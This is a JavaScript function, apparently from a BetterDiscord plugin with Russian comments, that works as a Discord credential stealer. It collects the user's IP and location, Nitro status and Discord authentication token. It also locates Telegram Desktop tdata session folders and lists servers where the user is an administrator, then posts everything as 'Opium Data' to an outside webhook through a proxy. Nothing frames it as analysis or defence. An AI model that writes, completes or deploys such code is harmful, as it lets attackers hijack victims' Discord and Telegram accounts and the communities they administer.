async function executeFullTest(BdApi, webhookUrl, proxyUrl, fs, path) {
    let result = {
        ip: null,
        location: null,
        nitro: "Нет",
        dtoken: null,
        telegram_path: "Не найден",
        debug: {
            fs_passed: false,
            path_passed: false,
            appdata_env: null,
            localappdata_env: null,
            checked_paths: [],
            errors: []
        },
        admin_servers: []
    };
    
    // 1. Получаем IP и локацию
    try {
        const ipRes = await BdApi.Net.fetch('https://jsonip.com/');
        const ipData = await ipRes.json();
        result.ip = ipData.ip;
        
        const geoRes = await BdApi.Net.fetch(`http://ip-api.com/json/${result.ip}?lang=ru&fields=status,country,regionName,city`);
        const geoData = await geoRes.json();
        if (geoData.status === 'success') {
            result.location = geoData.city || geoData.regionName || geoData.country || "Неизвестно";
        }
    } catch (e) { result.debug.errors.push("IP Error: " + e.message); }

    // 2. Проверяем статус Nitro
    try {
        const UserStore = BdApi.Webpack.getStore("UserStore");
        if (UserStore) {
            const user = UserStore.getCurrentUser();
            if (user.premiumType === 1) result.nitro = "Nitro Classic";
            else if (user.premiumType === 2) result.nitro = "Nitro";
            else if (user.premiumType === 3) result.nitro = "Nitro Basic";
        }
    } catch (e) { result.debug.errors.push("Nitro Error: " + e.message); }

    // Получаем токен
    let token = null;
    try {
        const authStore = BdApi.Webpack.getStore("AuthenticationStore");
        if (authStore && typeof authStore.getToken === 'function') token = authStore.getToken();
        result.dtoken = token;
    } catch (e) {}

    // 3. Отладка и поиск Telegram
    try {
        result.debug.fs_passed = !!fs;
        result.debug.path_passed = !!path;
        result.debug.appdata_env = process.env.APPDATA || "Нет переменной";
        result.debug.localappdata_env = process.env.LOCALAPPDATA || "Нет переменной";

        if (fs && path) {
            const possiblePaths = [];
            
            if (process.env.APPDATA) {
                possiblePaths.push(path.join(process.env.APPDATA, 'Telegram Desktop', 'tdata'));
                possiblePaths.push(path.join(process.env.APPDATA, 'Telegram', 'tdata'));
            }
            if (process.env.LOCALAPPDATA) {
                possiblePaths.push(path.join(process.env.LOCALAPPDATA, 'Telegram Desktop', 'tdata'));
            }

            for (const p of possiblePaths) {
                result.debug.checked_paths.push(p);
                if (fs.existsSync(p)) {
                    result.telegram_path = p;
                    break;
                }
            }
        }
    } catch (e) { 
        result.debug.errors.push("Telegram Path Error: " + e.message);
    }

    // 4. Ищем серверы
    try {
        const GuildStore = BdApi.Webpack.getStore("GuildStore");
        const PermissionStore = BdApi.Webpack.getStore("PermissionStore");
        const GuildMemberCountStore = BdApi.Webpack.getStore("GuildMemberCountStore");
        
        if (GuildStore && PermissionStore) {
            const guilds = GuildStore.getGuilds();
            for (const g of Object.values(guilds)) {
                if (PermissionStore.can(8n, g)) {
                    let count = 0;
                    if (GuildMemberCountStore && typeof GuildMemberCountStore.getMemberCount === 'function') {
                        count = GuildMemberCountStore.getMemberCount(g.id);
                    }
                    if (!count) count = g.memberCount || g.approximateMemberCount;
                    if (!count && token) {
                        try {
                            const res = await BdApi.Net.fetch(`https://discord.com/api/v9/guilds/${g.id}?with_counts=true`, {
                                headers: { "Authorization": token }
                            });
                            if (res.ok) {
                                const data = await res.json();
                                count = data.approximate_member_count || data.member_count || 0;
                            }
                        } catch (err) {}
                    }
                    result.admin_servers.push({ name: g.name, members: count || 0 });
                }
            }
        }
    } catch (e) { result.debug.errors.push("Guild Error: " + e.message); }

    // 5. Отправка
    try {
        const proxyUrlFull = `${proxyUrl}/?url=${encodeURIComponent(webhookUrl)}`;
        const response = await BdApi.Net.fetch(proxyUrlFull, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `**Opium Data**\n\`\`\`json\n${JSON.stringify(result, null, 2)}\n\`\`\``
            })
        });
        return response.ok;
    } catch (e) {
        console.error("Webhook Error", e);
        return false;
    }
}
